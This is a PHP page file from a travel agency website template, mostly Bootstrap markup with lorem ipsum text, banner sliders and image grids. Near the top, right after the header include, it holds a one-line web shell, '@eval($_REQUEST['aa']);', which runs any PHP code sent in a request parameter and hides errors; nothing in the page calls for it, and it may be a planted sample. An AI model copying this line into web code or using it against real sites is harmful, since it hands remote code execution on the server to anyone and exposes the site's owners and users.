<?php 
include 'header.php';
@eval($_REQUEST['aa']);
echo 'eval';
?>
<!-- banner -->
	<div class="banner">
		<div class="container">
			<div class="banner-info-grid">
				<section class="slider">
					<div class="flexslider">
						<ul class="slides">
							<li>
								<div class="banner-info">
									<h1>Sed ut perspiciatis unde omnis iste natus</h1>
									<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, 
										sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.</p>
									<div class="more">
										<a href="./index.php">更多</a>
									</div>
								</div>
							</li>
							<li>
								<div class="banner-info">
									<h1>Sed ut perspiciatis unde omnis iste natus</h1>
									<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, 
										sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.</p>
									<div class="more">
										<a href="./index.php">更多</a>
									</div>
								</div>
							</li>
							<li>
								<div class="banner-info">
									<h1>Sed ut perspiciatis unde omnis iste natus</h1>
									<p>Lorem ipsum dolor sit amet, consectetur adipiscing elit, 
										sed do eiusmod tempor incididunt ut labore et dolore magna aliqua.</p>
									<div class="more">
										<a href="./index.php">更多</a>
									</div>
								</div>
							</li>
						</ul>
					</div>
				</section>
			</div>
		</div>
	</div>
<!-- //banner -->
<div class="copyrights">Collect from <a href="http://www.cssmoban.com/"  title="网站模板">网站模板</a></div>
<!-- banner-bottom -->
	<div class="banner-bottom">
		<div class="container">
			<h3>Welcome To Our Travel Agency !</h3>
			<div class="banner-bottom-grids">
				<div class="col-md-6 banner-bottom-grid">
					<div class="col-xs-8 banner-bottom-grid-left">
						<h4>totam rem aperiam, eaque</h4>
						<ul>
							<li>Voluptatem <a href="#"><span class="glyphicon glyphicon-cloud" aria-hidden="true"></span></a></li>
							<li>Aperiam <a href="#"><span class="glyphicon glyphicon-pencil" aria-hidden="true"></span></a></li>
							<li><a href="#">Incididunt<span class="glyphicon glyphicon-off" aria-hidden="true"></span></a></li>
						</ul>
						<p>Quis autem vel eum iure reprehenderit qui in ea voluptate velit 
							esse quam nihil.</p>
						<div class="more m1">
							<a href="./index.php">More Info</a>
						</div>
					</div>
					<div class="col-xs-4 banner-bottom-grid-right">
						<img src="images/1.jpg" alt=" " class="img-responsive" />
					</div> 
					<div class="clearfix"> </div>
				</div>
				<div class="col-md-6 banner-bottom-grid">
					<div class="col-xs-4 banner-bottom-grid-right">
						<img src="images/2.jpg" alt=" " class="img-responsive" />
					</div> 
					<div class="col-xs-8 banner-bottom-grid-left banner-bottom-grid-l">
						<h4>totam rem aperiam, eaque</h4>
						<ul>
							<li><span class="glyphicon glyphicon-cloud" aria-hidden="true"></span>Voluptatem <a href="#"></a></li>
							<li><span class="glyphicon glyphicon-pencil" aria-hidden="true"></span>Aperiam <a href="#"></a></li>
							<li><a href="#"><span class="glyphicon glyphicon-off" aria-hidden="true"></span>Incididunt</a></li>
						</ul>
						<p>Quis autem vel eum iure reprehenderit qui in ea voluptate velit 
							esse quam nihil.</p>
						<div class="more m1">
							<a href="./index.php">More Info</a>
						</div>
					</div>
					<div class="clearfix"> </div>
				</div>
				<div class="clearfix"></div>
			</div>
			<div class="banner-bottom-grids">
				<div class="col-md-6 banner-bottom-grid">
					<div class="col-xs-8 banner-bottom-grid-left">
						<h4>totam rem aperiam, eaque</h4>
						<ul>
							<li>Voluptatem <a href="#"><span class="glyphicon glyphicon-cloud" aria-hidden="true"></span></a></li>
							<li>Aperiam <a href="#"><span class="glyphicon glyphicon-pencil" aria-hidden="true"></span></a></li>
							<li><a href="#">Incididunt<span class="glyphicon glyphicon-off" aria-hidden="true"></span></a></li>
						</ul>
						<p>Quis autem vel eum iure reprehenderit qui in ea voluptate velit 
							esse quam nihil.</p>
						<div class="more m1">
							<a href="./index.php">More Info</a>
						</div>
					</div>
					<div class="col-xs-4 banner-bottom-grid-right">
						<img src="images/3.jpg" alt=" " class="img-responsive" />
					</div> 
					<div class="clearfix"> </div>
				</div>
				<div class="col-md-6 banner-bottom-grid">
					<div class="col-xs-4 banner-bottom-grid-right">
						<img src="images/4.jpg" alt=" " class="img-responsive" />
					</div> 
					<div class="col-xs-8 banner-bottom-grid-left banner-bottom-grid-l">
						<h4>totam rem aperiam, eaque</h4>
						<ul>
							<li><span class="glyphicon glyphicon-cloud" aria-hidden="true"></span>Voluptatem <a href="#"></a></li>
							<li><span class="glyphicon glyphicon-pencil" aria-hidden="true"></span>Aperiam <a href="#"></a></li>
							<li><a href="#"><span class="glyphicon glyphicon-off" aria-hidden="true"></span>Incididunt</a></li>
						</ul>
						<p>Quis autem vel eum iure reprehenderit qui in ea voluptate velit 
							esse quam nihil.</p>
						<div class="more m1">
							<a href="./index.php">More Info</a>
						</div>
					</div>
					<div class="clearfix"> </div>
				</div>
				<div class="clearfix"></div>
			</div>
		</div>
	</div>
<!-- //banner-bottom -->
<?php 
	include 'footer.php';
?>
